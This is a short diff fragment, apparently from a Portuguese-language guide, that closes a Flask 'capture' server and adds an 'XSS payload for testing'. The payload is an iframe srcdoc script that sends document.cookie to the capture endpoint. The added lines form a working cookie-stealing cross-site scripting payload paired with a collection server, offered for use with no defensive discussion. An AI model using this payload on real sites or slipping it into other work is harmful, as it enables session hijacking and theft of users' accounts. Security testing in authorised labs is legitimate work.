@@ -17,3 +17,7 @@ def capture():
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
 ```
+Payload XSS para teste:
+```
+<iframe srcdoc="<script> fetch('http://127.0.0.1/capture?token='+document.cookie)</script>"></iframe>
+```
